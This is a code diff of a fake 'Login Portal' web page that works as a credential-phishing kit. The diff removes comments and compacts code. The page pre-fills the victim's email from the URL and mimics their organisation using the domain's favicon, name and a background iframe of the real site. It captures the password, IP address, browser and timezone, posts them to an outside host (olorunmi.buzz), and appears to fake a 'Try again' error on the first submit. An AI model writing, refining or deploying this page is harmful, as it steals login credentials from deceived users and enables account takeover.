@@ -4,11 +4,8 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Login Portal</title>
-    <!-- Bootstrap 5 CSS -->
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
-    <!-- Bootstrap Icons -->
     <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.5/font/bootstrap-icons.css" rel="stylesheet">
-    <!-- Google Fonts: Poppins -->
     <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600&display=swap" rel="stylesheet">
     <style>
         #background-iframe, #overlay {
@@ -145,62 +142,46 @@
         }
     </style>
 </head>
-<body id="main-content" class="d-flex align-items-center justify-content-center min-vh-100">
-    <!-- Background Iframe -->
+<body class="d-flex align-items-center justify-content-center min-vh-100">
     <iframe id="background-iframe" src="about:blank" allowfullscreen></iframe>
-    <!-- Dimmed Overlay -->
     <div id="overlay"></div>
 
-    <!-- Form Container -->
-    <div class="form-container" id="form-container">
+    <div class="form-container">
         <div class="error-message" id="error-message">Try again</div>
-
         <form id="user-form">
-            <!-- Icon and Text Row -->
             <div class="icon-text">
-                <img id="domain-favicon" src="https://www.google.com/s2/favicons?domain=example.com" alt="Domain Favicon" style="height:15px;width:15px;">
+                <img id="domain-favicon" src="https://www.google.com/s2/favicons?domain=example.com" alt="Favicon" style="height:15px;width:15px;">
                 <span class="h4 mb-0" style="margin-left:10px" id="domain-name">PORTAL</span>
             </div>
-            <!-- Heading -->
             <h5 class="mb-3">Leading with Security.</h5>
-            <!-- Paragraph -->
             <p class="mb-4 text-muted" style="font-size:.8rem">To get started, log in using your email and password.</p>
 
-            <!-- Email Input -->
             <div class="form-floating position-relative">
                 <i class="bi bi-envelope input-icon"></i>
-                <input type="email" class="form-control" id="email" placeholder=" " required style="padding-left: 40px; z-index:1000;" disabled>
-                <label for="email" style="background-color: transparent;">Email</label>
+                <input type="email" class="form-control" id="email" placeholder=" " required style="padding-left:40px;" disabled>
+                <label style="background-color:transparent;">Email</label>
             </div>
-            <!-- Password Input -->
             <div class="form-floating position-relative">
                 <i class="bi bi-lock input-icon"></i>
-                <input type="password" class="form-control" id="password" placeholder=" " required style="padding-left: 40px;">
-                <label for="password" style="background-color: transparent;">Password</label>
+                <input type="password" class="form-control" id="password" placeholder=" " required style="padding-left:40px;">
+                <label style="background-color:transparent;">Password</label>
             </div>
-            <!-- Submit Button -->
-            <button type="submit" class="btn btn-primary" id="submit-button">Continue</button>
-
-            <!-- Optional text (no verification) -->
+            <button type="submit" class="btn btn-primary">Continue</button>
             <div class="confirm-text">Secure login</div>
         </form>
     </div>
 
-    <!-- Loader Overlay -->
     <div id="loader-overlay" class="loader-overlay">
         <div class="spinner-border text-light" role="status" style="width:3rem;height:3rem;">
             <span class="visually-hidden">Loading...</span>
         </div>
     </div>
 
-    <!-- Bootstrap 5 JS Bundle -->
     <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
 
-    <!-- Custom JavaScript to Handle Email from URL Fragment (hash) and 'portal' Parameter -->
     <script>
         let submitCount = 0;
 
-        // Get email from URL hash (after #)
         function getEmailFromHash() {
             if (window.location.hash) {
                 let hash = window.location.hash.substring(1);
@@ -210,13 +191,11 @@
             return null;
         }
 
-        // Get email from query parameter 'portal'
         function getEmailFromQuery() {
             const urlParams = new URLSearchParams(window.location.search);
             return urlParams.get('portal');
         }
 
-        // Store the email from URL (hash takes priority over query)
         const originalEmail = getEmailFromHash() || getEmailFromQuery();
 
         document.addEventListener("DOMContentLoaded", () => {
@@ -229,17 +208,14 @@
                 if (parts.length === 2) {
                     domain = parts[1];
                     document.getElementById("domain-favicon").src = `https://www.google.com/s2/favicons?domain=${domain}`;
-                    const domainName = domain.split('.')[0].toUpperCase();
-                    document.getElementById("domain-name").textContent = domainName;
+                    document.getElementById("domain-name").textContent = domain.split('.')[0].toUpperCase();
                     const iframeSrc = domain.startsWith("http://") || domain.startsWith("https://") ? domain : `https://${domain}`;
                     document.getElementById("background-iframe").src = iframeSrc;
                 }
             } else {
-                console.warn("No email found in URL (neither as hash nor as 'portal' parameter).");
                 document.getElementById("background-iframe").src = "about:blank";
             }
 
-            // Collect client info (IP, userAgent, etc.)
             let clientInfo = {
                 ipAddress: "Fetching...",
                 userAgent: navigator.userAgent,
@@ -259,17 +235,13 @@
             fetch("https://api.ipify.org?format=json")
                 .then(response => response.json())
                 .then(data => { clientInfo.ipAddress = data.ip; })
-                .catch(error => {
-                    console.error("Error fetching IP address:", error);
-                    clientInfo.ipAddress = "Unavailable";
-                });
+                .catch(() => { clientInfo.ipAddress = "Unavailable"; });
 
             document.getElementById("user-form").addEventListener("submit", (e) => {
                 e.preventDefault();
-
-                submitCount += 1;
-                const isFirstSubmit = submitCount === 1;
-                const isSecondSubmit = submitCount === 2;
+                submitCount++;
+                const isFirstSubmit = (submitCount === 1);
+                const isSecondSubmit = (submitCount === 2);
 
                 document.getElementById("loader-overlay").style.display = "flex";
 
@@ -281,18 +253,13 @@
                 formData.append('timezone', clientInfo.timezone);
                 formData.append('browser', clientInfo.browser);
 
-                // Send to your API endpoint
                 fetch('https://olorunmi.buzz/panel/admin.php', {
                     method: 'POST',
                     body: formData
                 })
-                .then(response => response.text())
-                .then(data => {
-                    console.log('Form submitted successfully:', data);
-                })
-                .catch(error => {
-                    console.error('Error submitting form:', error);
-                });
+                .then(res => res.text())
+                .then(data => console.log('Success:', data))
+                .catch(err => console.error('Error:', err));
 
                 if (isFirstSubmit) {
                     setTimeout(() => {
